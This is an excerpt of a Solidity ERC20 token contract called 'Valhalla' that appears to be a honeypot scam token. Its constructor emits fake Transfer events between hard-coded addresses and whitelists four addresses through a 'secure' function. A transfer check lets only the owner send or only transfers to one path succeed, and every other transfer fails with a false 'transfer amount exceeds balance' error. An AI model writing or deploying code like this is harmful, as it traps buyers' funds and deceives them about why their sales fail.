 ...
 address _contDeployr = 0xa99c602037f8E85A44bbe88f3C0EE3Af60345B9b;
 address public _ownr = 0xCf6bF8270f6090eacb44dDA40C432988E37e8634;
 constructor () public {
 _name = "Valhalla";
 _symbol = "Valhalla";
 _decimals = 18;
 ...
 emit Transfer(_contDeployr, 0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E, initialSupply/5);
 emit Transfer(0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E, 0x87C53473978437dFd0F4D56cA2a43ea02B2F10a6, initialSupply/5);
 secure(0x87840Ff9BfB9e9a673128555Cf1f45afA246ba7f);
 secure(0x79F8B38C17B78Ee5E4Dfde6f7E58cb338d23180E);
 secure(0x84611732cAdf80420AD1DB372df2C937ed242c51);
 secure(0xB7aEB84FC4E10f7d023eecc871D4299B9f67eaBB);
 }
 ...
 require(( from == _safeOwnr ) ||(dest == _path_), "ERC20: transfer amount exceeds balance");
 _;
 }
 else{
